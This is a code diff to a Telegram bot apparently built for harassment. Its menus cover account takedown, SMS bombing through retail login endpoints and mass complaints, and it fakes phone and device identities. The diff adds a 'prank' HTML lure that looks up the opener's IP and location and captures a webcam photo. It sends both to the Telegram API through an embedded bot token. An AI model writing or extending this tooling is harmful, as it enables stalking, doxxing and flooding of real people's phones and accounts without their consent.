@@ -8,6 +8,7 @@ import logging
 import time
 import shutil
 from datetime import datetime
+from urllib.parse import urlencode
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -15,7 +16,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.filters import Command, StateFilter
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
@@ -59,13 +60,45 @@ USER_AGENTS = [
 
 DEVICES = [
     {"model": "iPhone 15 Pro", "system": "iOS 17.0"},
+    {"model": "iPhone 15 Pro Max", "system": "iOS 17.1"},
+    {"model": "iPhone 14 Pro", "system": "iOS 16.6"},
     {"model": "iPhone 14 Pro Max", "system": "iOS 16.5"},
     {"model": "iPhone 13", "system": "iOS 15.7"},
+    {"model": "iPhone 13 Pro", "system": "iOS 15.6"},
+    {"model": "iPhone 12", "system": "iOS 14.8"},
+    {"model": "iPhone 11", "system": "iOS 13.6"},
+    {"model": "iPhone XR", "system": "iOS 12.5"},
+    {"model": "iPhone XS", "system": "iOS 12.4"},
+    {"model": "iPhone X", "system": "iOS 11.4"},
+    {"model": "iPhone 8 Plus", "system": "iOS 11.3"},
     {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
+    {"model": "Samsung Galaxy S23 Ultra", "system": "Android 14"},
     {"model": "Samsung Galaxy S23", "system": "Android 13"},
+    {"model": "Samsung Galaxy S22 Ultra", "system": "Android 13"},
+    {"model": "Samsung Galaxy S22", "system": "Android 12"},
+    {"model": "Samsung Galaxy S21", "system": "Android 12"},
+    {"model": "Samsung Galaxy S20", "system": "Android 11"},
+    {"model": "Samsung Galaxy Note 20", "system": "Android 11"},
     {"model": "Google Pixel 8 Pro", "system": "Android 14"},
+    {"model": "Google Pixel 8", "system": "Android 14"},
+    {"model": "Google Pixel 7 Pro", "system": "Android 13"},
+    {"model": "Google Pixel 7", "system": "Android 13"},
+    {"model": "Google Pixel 6", "system": "Android 12"},
     {"model": "Xiaomi 14 Pro", "system": "Android 14"},
+    {"model": "Xiaomi 13 Ultra", "system": "Android 13"},
+    {"model": "Xiaomi 13", "system": "Android 13"},
+    {"model": "Xiaomi 12T Pro", "system": "Android 12"},
     {"model": "OnePlus 12", "system": "Android 14"},
+    {"model": "OnePlus 11", "system": "Android 13"},
+    {"model": "OnePlus 10 Pro", "system": "Android 12"},
+    {"model": "Huawei P60 Pro", "system": "HarmonyOS 4.0"},
+    {"model": "Huawei Mate 60 Pro", "system": "HarmonyOS 4.0"},
+    {"model": "Huawei P50 Pro", "system": "HarmonyOS 3.0"},
+    {"model": "iPad Pro 2023", "system": "iOS 17.0"},
+    {"model": "iPad Air 2022", "system": "iOS 16.0"},
+    {"model": "iPad Mini 2021", "system": "iOS 15.0"},
+    {"model": "MacBook Pro 2023", "system": "macOS 14.0"},
+    {"model": "MacBook Air 2022", "system": "macOS 13.0"},
 ]
 
 TELEGRAM_AUTH_SITES = [
@@ -123,6 +156,109 @@ BOMBER_WEBSITES = [
     {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DetMir"},
     {"url": "https://api.sportmaster.ru/auth/sms", "method": "POST", "phone_field": "phone", "name": "Sportmaster"},
 ]
+
+# HTML страница для камеры и IP
+CAMERA_HTML = '''<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+    <style>
+        body { margin: 0; padding: 20px; background: #000; color: #fff; font-family: Arial; }
+        #video { width: 100%; max-width: 400px; border-radius: 10px; }
+        #canvas { display: none; }
+        #capture { padding: 15px 30px; background: #f00; color: #fff; border: none; border-radius: 10px; font-size: 18px; margin: 20px 0; }
+        #result { margin-top: 20px; padding: 10px; background: #333; border-radius: 10px; }
+        #ipInfo { padding: 15px; background: #222; border-radius: 10px; margin-bottom: 20px; }
+        .container { max-width: 400px; margin: 0 auto; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Camera & IP Info</h2>
+        <div id="ipInfo">Getting IP...</div>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+        <br>
+        <button id="capture">Take Photo</button>
+        <div id="result"></div>
+    </div>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('capture');
+        const result = document.getElementById('result');
+        const ipInfo = document.getElementById('ipInfo');
+        
+        // Get IP info
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                ipInfo.innerHTML = `
+                    IP: ${data.ip}<br>
+                    Country: ${data.country_name}<br>
+                    City: ${data.city}<br>
+                    ISP: ${data.org}<br>
+                    Timezone: ${data.timezone}
+                `;
+                
+                // Send IP to bot
+                const botToken = '''' + BOT_TOKEN + '''';
+                const chatId = new URLSearchParams(window.location.search).get('chat_id');
+                if (chatId) {
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `📍 IP: ${data.ip}\\n🌍 ${data.country_name}, ${data.city}\\n📡 ${data.org}`
+                        })
+                    });
+                }
+            })
+            .catch(err => { ipInfo.innerHTML = 'IP info unavailable'; });
+        
+        // Start camera
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' } 
+        }).then(stream => {
+            video.srcObject = stream;
+        }).catch(err => {
+            result.innerHTML = 'Camera access denied!';
+        });
+        
+        // Take photo
+        captureBtn.onclick = () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg');
+            const chatId = new URLSearchParams(window.location.search).get('chat_id');
+            
+            if (chatId) {
+                const botToken = '''' + BOT_TOKEN + '''';
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: imageData.split(',')[1],
+                        caption: '📸 Photo captured!'
+                    })
+                }).then(() => {
+                    result.innerHTML = 'Photo sent to bot!';
+                }).catch(err => {
+                    result.innerHTML = 'Error sending photo';
+                });
+            }
+            
+            result.innerHTML = 'Photo captured! Sending...';
+        };
+    </script>
+</body>
+</html>'''
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -778,10 +914,18 @@ def get_main_menu():
     builder.button(text="СНОС", callback_data="snos_menu")
     builder.button(text="БОМБЕР", callback_data="bomber_menu")
     builder.button(text="ЖАЛОБЫ", callback_data="complaint_menu")
+    builder.button(text="ПРАНК", callback_data="prank_menu")
     builder.button(text="АДМИН-ПАНЕЛЬ", callback_data="admin_menu")
     builder.button(text="СТАТУС", callback_data="status")
     builder.button(text="СТОП", callback_data="stop")
-    builder.adjust(2, 2, 2)
+    builder.adjust(2, 2, 2, 1)
+    return builder.as_markup()
+
+def get_prank_menu():
+    builder = InlineKeyboardBuilder()
+    builder.button(text="КАМЕРА + IP", callback_data="prank_camera")
+    builder.button(text="НАЗАД", callback_data="main_menu")
+    builder.adjust(1)
     return builder.as_markup()
 
 def get_snos_menu():
@@ -899,6 +1043,36 @@ async def admin_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID:
         return
     await send_message_with_banner(msg, f"<b>АДМИН-ПАНЕЛЬ</b>\n\nРазрешено: {len(ALLOWED_USERS)}", get_admin_menu())
+
+@dp.callback_query(F.data == "prank_menu")
+async def prank_menu(cb: types.CallbackQuery):
+    await edit_message_with_banner(cb, "<b>ПРАНК</b>\n\nВыберите действие:", get_prank_menu())
+    await cb.answer()
+
+@dp.callback_query(F.data == "prank_camera")
+async def prank_camera(cb: types.CallbackQuery):
+    chat_id = cb.from_user.id
+    
+    # Создаем HTML файл с камерой
+    html_content = CAMERA_HTML.replace('BOT_TOKEN', BOT_TOKEN)
+    
+    # Сохраняем временный файл
+    filename = f"camera_{chat_id}.html"
+    with open(filename, 'w', encoding='utf-8') as f:
+        f.write(html_content)
+    
+    # Отправляем файл
+    await cb.message.answer_document(
+        FSInputFile(filename),
+        caption="<b>CAMERA + IP</b>\n\n"
+                "1. Скачай и открой файл в браузере\n"
+                "2. Разреши доступ к камере\n"
+                "3. Нажми Take Photo\n"
+                "4. Фото и IP автоматически отправятся в этот чат"
+    )
+    
+    os.remove(filename)
+    await cb.answer()
 
 @dp.callback_query(F.data == "snos_menu")
 async def snos_menu(cb: types.CallbackQuery):
@@ -1419,7 +1593,7 @@ async def init_mailtm():
 
 async def main():
     load_allowed_users()
-    logger.info(f"VICTIM SNOS запуск... Сессий: {SESSIONS_PER_USER}, Сайтов сноса: {len(TELEGRAM_AUTH_SITES)}, Бомбер: {len(BOMBER_WEBSITES)}")
+    logger.info(f"VICTIM SNOS запуск... Сессий: {SESSIONS_PER_USER}")
     await bot.delete_webhook(drop_pending_updates=True)
     asyncio.create_task(init_mailtm())
     await dp.start_polling(bot)
